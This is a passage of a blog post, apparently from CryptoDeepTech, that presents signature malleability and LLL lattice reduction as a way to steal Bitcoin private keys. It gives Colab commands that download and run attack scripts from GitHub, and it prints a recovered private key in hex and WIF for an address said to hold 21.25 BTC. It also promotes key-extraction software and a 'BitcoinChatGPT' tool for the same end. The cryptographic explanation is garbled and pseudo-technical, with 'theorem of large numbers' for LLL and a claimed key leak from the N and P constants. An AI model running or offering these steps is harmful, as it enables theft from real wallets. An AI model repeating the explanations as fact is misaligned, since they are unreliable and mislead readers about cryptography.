<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-10-1024x543.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-10-1024x543.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-9-1024x549.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-9-1024x549.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-8-1024x545.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-8-1024x545.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-6-1024x544.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-6-1024x544.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Using&nbsp;<a href="https://perelmanwork.com/"><strong>Perelman Work</strong></a>&nbsp;and&nbsp;<a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/"><strong>Dockeyhunt&nbsp;</strong></a><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/"><strong>Lattice Attack, we arbitrarily change variables to&nbsp;</strong></a><a href="https://cryptodeeptech.ru/signature-malleability/"><strong>Signature Malleability</strong></a>&nbsp;vulnerability&nbsp;as we wrote at the beginning&nbsp;<a href="https://cryptodeeptech.ru/signature-malleability/">of the article</a>&nbsp;this vulnerability in Bitcoin transaction occurs due to the fact that it is possible to change the value of&nbsp;&nbsp;<strong>S</strong>&nbsp;&nbsp;in the signature, while maintaining the validity of the signature. As we reported in the arbitrary formula all this is possible due to the fact that for the same signature it is possible to obtain several equivalent values&nbsp;&nbsp;<strong>​​(r,s′)</strong>&nbsp;:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-37.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-37.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>As a final result of the transformation of variables in the signature value&nbsp;<strong>R, S′, Z</strong>&nbsp;we see two digits the value&nbsp;<strong><em>S</em>&nbsp;′</strong>&nbsp;is built as&nbsp;<strong>a field structure (P)</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>This number defines the field in which the&nbsp;<strong>secp256k1</strong>&nbsp;curve operates to perform mathematical operations on points on&nbsp;<em>an elliptic curve</em>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/isWxfa3PeHU?t=1250"></a><em><a href="https://youtu.be/isWxfa3PeHU?t=1250">Time-stamped video</a></em></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_p.py">Python script: value_p.py</a></em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#python-script-value_ppy-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-18.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-18.png" alt="Signature Malleability"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Now we know the signatures of the difference between the numbers&nbsp;<strong>N</strong>&nbsp;and&nbsp;<strong>P</strong>&nbsp;. When reducing, we can get a hidden number&nbsp;<strong>X</strong>&nbsp;as we know when shifting the generation of one-time numbers&nbsp;<strong>(NONCES)</strong>&nbsp;, the value of the signature variables&nbsp;<strong>R, S′, Z</strong>&nbsp;will tend to one point. This point will be a hidden number, that is,&nbsp;<em><strong>a private key</strong></em>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>(&nbsp;<strong>N</strong>&nbsp;&nbsp;are&nbsp;&nbsp;<em>point group structures</em>&nbsp;,&nbsp;&nbsp;<strong>P</strong>&nbsp;&nbsp;are&nbsp;&nbsp;<em>field structures</em>&nbsp;,&nbsp;<strong>X</strong>&nbsp;&nbsp;is&nbsp;&nbsp;<em>a private key</em>&nbsp;)</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>To obtain a private key, we will use&nbsp;<a href="https://keyhunters.ru/lattice-reduction-algorithms/">the lattice reduction algorithm&nbsp;<strong>(theorem of large numbers)</strong>&nbsp;.</a></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-54.png"></a><em><strong><a href="https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm">Reduction of a lattice basis in two-dimensional space: the lattice is represented by blue dots, the original basis by black vectors, the reduced basis by red vectors.</a></strong></em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://keyhunters.ru/lattice-reduction-algorithms/">Lenstra-Lenstra-Lovasz (LLL) Lattice Reduction Algorithm</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#lenstra-lenstra-lovasz-lll-lattice-reduction-algorithm"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s use the LLL</strong>&nbsp;source code&nbsp;from&nbsp;<strong><a href="https://www.linkedin.com/in/darioclavijo">Darío Clavijo,</a></strong>&nbsp;a well-known developer on&nbsp;<strong>GitHub:&nbsp;</strong><strong><a href="https://github.com/daedalus">daedalus</a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://github.com/daedalus/BreakingECDSAwithLLL.git"></a><em><a href="https://github.com/daedalus/BreakingECDSAwithLLL.git"><strong>Repositories</strong></a></em></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-39.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-39.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://keyhunters.ru/google-colab-in-cryptanalysis/">Install SageMath in Google Colab:</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!sudo apt-get install sagemath python3-ecdsa</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-40.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-40.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Commands:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!wget https://raw.githubusercontent.com/demining/CryptoDeepTools/refs/heads/main/36SignatureMalleability/latticereductions.py
!wget https://raw.githubusercontent.com/demining/CryptoDeepTools/refs/heads/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-41-1024x350.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-41-1024x350.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Run&nbsp;<em>the Python</em>&nbsp;script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/latticereductions.py">latticereductions.py</a>&nbsp;and get&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey">the private key</a>&nbsp;to the Bitcoin Address:&nbsp;<a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw">1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!cat Ricci_Flow_Hidden_Number_Problem.txt &gt; nonces.csv
!python latticereductions.py nonces.csv 243 32</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-42-1024x539.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-42-1024x539.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Result:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Install the Bitcoin</strong><em>&nbsp;library&nbsp;</em><a href="https://keyhunters.ru/exploring-bitcoin-tools-in-python-a-comprehensive-guide-to-the-bitcoin-package-on-pypi/"></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!pip install bitcoin</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-43-1024x286.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-43-1024x286.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Let’s run&nbsp;&nbsp;</em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/priv_addr.py"><strong>the code</strong></a><em>&nbsp;&nbsp;to check the Bitcoin Address match:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-44.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-44.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>__________________________________________________

Private Key WIF: 17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951
Bitcoin Address: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw
total_received 	= 21.25292140 Bitcoin
__________________________________________________
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>That’s right! The private key corresponds to the Bitcoin Wallet.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Let’s open&nbsp;&nbsp;<strong><a href="https://cryptodeeptech.ru/bitaddress.html">bitaddress</a></strong>&nbsp;&nbsp;and check:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#lets-openbitaddressand-check"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ADDR: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw
WIF:  5HzpNjEsxrpxPFqBKaoRSnFeq7RP57mvzwgoQFVtAJNZBpLVyur
HEX:  17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-45.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-45.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/">Dockeyhunt Lattice Attack</a></strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#dockeyhunt-lattice-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>Let’s consider obtaining a private key using the&nbsp;<strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/">Dockeyhunt Lattice Attack software as an example</a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>To start&nbsp;<em><a href="https://keyhunters.ru/lattice-reduction-algorithms/">the lattice reduction algorithm,</a></em>&nbsp;click on the button:&nbsp;<strong><code>Private Key</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/isWxfa3PeHU?t=1279"></a><a href="https://youtu.be/isWxfa3PeHU?t=1279"><strong>Time-stamped video</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>Next we need to make sure that we have received the required private key value in&nbsp;<strong>HEX format.</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://youtu.be/isWxfa3PeHU?t=1284"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-49.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>Click on the button&nbsp;<strong><code>Bitcoin Address</code></strong>and get the required value of the private key in&nbsp;<strong>HEX format</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-50-1.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-50-1.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>We also click on the button&nbsp;<strong><code>Balance BTC</code></strong>and get the result of the balance amount:</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>_____________________________________________________________________________________________________

17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw: 21.2529214 BTC
_____________________________________________________________________________________________________

</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/isWxfa3PeHU?t=1310"></a><strong><a href="https://youtu.be/isWxfa3PeHU?t=1310">Time-stamped video</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-52.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-52.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Private key received!</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>To search for the&nbsp;<strong>Signature Malleability vulnerability, as a threat prevention for your own&nbsp;</strong><strong>Bitcoin</strong>&nbsp;and&nbsp;<strong>Ethereum</strong>&nbsp;cryptocurrency wallet,&nbsp;we can use and apply various machine learning methods to examples</em>&nbsp;.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Let’s use the list from&nbsp;&nbsp;<a href="https://github.com/demining/Tutorials-Power-AI"><strong>“Tutorials Power AI”</strong></a>&nbsp;&nbsp;a widely used category of artificial intelligence to introduce business in various fields of cryptanalysis and cryptography in general.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><em>Installation command:</em></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>git clone https://github.com/demining/Tutorials-Power-AI.git

cd Tutorials-Power-AI/

python tutorials.py
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/process.gif" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/process.gif" alt="Signature Malleability: A study of the vulnerability of a forged signature using a decodable Bitcoin Wallet file"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-1024x272.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-1024x272.png" alt="Signature Malleability: A study of the vulnerability of a forged signature using a decodable Bitcoin Wallet file"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://bitcoinchatgpt.org/"><strong>BitcoinChatGPT</strong></a>&nbsp;&nbsp;is an innovative AI-powered chatbot that helps users find vulnerabilities in Bitcoin cryptocurrency transactions. BitcoinChatGPT benefits and classifications give you the ability to check your Bitcoin address for various crypto wallet attack schemes. Machine learning based on cryptanalysis gives us the full ability to investigate various attacks on the algorithms used in the Bitcoin ecosystem. Bitcoin Wallet private key extraction tools are widely popular, where BitcoinChatGPT serves as an important and useful resource for cybersecurity.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Exploiting the CVE-2024-42461: Signature Malleability vulnerability in the Elliptic library to create a Raw transaction using the BitcoinChatGPT machine learning process</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#exploiting-the-cve-2024-42461-signature-malleability-vulnerability-in-the-elliptic-library-to-create-a-raw-transaction-using-the-bitcoinchatgpt-machine-learning-process"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s consider the construction of the structure of a vulnerable&nbsp;&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/RawTX.txt">Raw</a></strong>&nbsp;&nbsp;transaction in which the&nbsp;&nbsp;<strong><a href="https://bitcoinchatgpt.org/">BitcoinChatGPT module is used</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.youtube.com/watch?v=u7vD01x8Os8"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-2.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s open the Google Colab version:</strong></p>
